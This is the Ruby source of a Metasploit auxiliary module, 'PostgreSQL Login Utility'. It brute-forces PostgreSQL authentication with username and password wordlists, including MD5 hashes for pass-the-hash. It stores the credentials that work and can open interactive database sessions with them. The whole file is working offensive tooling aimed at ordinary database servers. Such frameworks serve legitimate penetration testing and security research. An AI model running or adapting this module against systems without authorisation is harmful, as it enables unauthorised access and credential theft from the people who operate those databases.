##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/postgres'
require 'rex/post/postgresql'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Postgres
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  # Creates an instance of this module.
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PostgreSQL Login Utility',
        'Description' => %q{
          This module attempts to authenticate against a PostgreSQL
          instance using username and password combinations indicated
          by the USER_FILE, PASS_FILE, and USERPASS_FILE options. Note that
          passwords may be either plaintext or MD5 formatted hashes.
        },
        'Author' => [ 'todb' ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => { 'CreateSession' => false },
        'References' => [
          [ 'URL', 'https://www.postgresql.org/' ],
          [ 'CVE', '1999-0502'], # Weak password
          [ 'URL', 'https://hashcat.net/forum/archive/index.php?thread-4148.html' ] # Pass the Hash
        ],
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        Opt::Proxies,
        OptPath.new('USERPASS_FILE', [
          false, "File containing (space-separated) users and passwords, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_userpass.txt")
        ]),
        OptPath.new('USER_FILE', [
          false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_user.txt")
        ]),
        OptPath.new('PASS_FILE', [
          false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_pass.txt")
        ]),
        OptBool.new('CreateSession', [false, 'Create a new session for every successful login', false])
      ]
    )

    options_to_deregister = %w[SQL]
    if framework.features.enabled?(Msf::FeatureManager::POSTGRESQL_SESSION_TYPE)
      add_info('New in Metasploit 6.4 - The %grnCreateSession%clr option within this module can open an interactive session')
    else
      options_to_deregister << 'CreateSession'
    end
    deregister_options(*options_to_deregister)
  end

  def create_session?
    if framework.features.enabled?(Msf::FeatureManager::POSTGRESQL_SESSION_TYPE)
      datastore['CreateSession']
    else
      false
    end
  end

  def run
    results = super
    logins = results.flat_map { |_k, v| v[:successful_logins] }
    sessions = results.flat_map { |_k, v| v[:successful_sessions] }
    print_status("Bruteforce completed, #{logins.size} #{logins.size == 1 ? 'credential was' : 'credentials were'} successful.")
    return results unless framework.features.enabled?(Msf::FeatureManager::POSTGRESQL_SESSION_TYPE)

    if create_session?
      print_status("#{sessions.size} Postgres #{sessions.size == 1 ? 'session was' : 'sessions were'} opened successfully.")
    else
      print_status('You can open a Postgres session with these credentials and %grnCreateSession%clr set to true')
    end
    results
  end

  # Loops through each host in turn. Note the current IP address is both
  # ip and datastore['RHOST']
  def run_host(ip)
    cred_collection = build_credential_collection(
      realm: datastore['DATABASE'],
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    scanner = Metasploit::Framework::LoginScanner::Postgres.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        proxies: datastore['Proxies'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 30,
        framework: framework,
        framework_module: self,
        use_client_as_proof: create_session?
      )
    )
    successful_logins = []
    successful_sessions = []
    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
        successful_logins << result

        if create_session?
          begin
            successful_sessions << session_setup(result)
          rescue ::StandardError => e
            elog('Failed to setup the session', error: e)
            print_brute level: :error, ip: ip, msg: "Failed to setup the session - #{e.class} #{e.message}"
            result.connection.close unless result.connection.nil?
          end
        end
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
    { successful_logins: successful_logins, successful_sessions: successful_sessions }
  end

  # Alias for RHOST
  def rhost
    datastore['RHOST']
  end

  # Alias for RPORT
  def rport
    datastore['RPORT']
  end

  # @param [Metasploit::Framework::LoginScanner::Result] result
  # @return [Msf::Sessions::PostgreSQL]
  def session_setup(result)
    return unless (result.connection && result.proof)

    my_session = Msf::Sessions::PostgreSQL.new(result.connection, { client: result.proof, **result.proof.detect_platform_and_arch })
    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE' => nil,
      'PASS_FILE' => nil,
      'USERNAME' => result.credential.public,
      'PASSWORD' => result.credential.private
    }

    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
  end
end
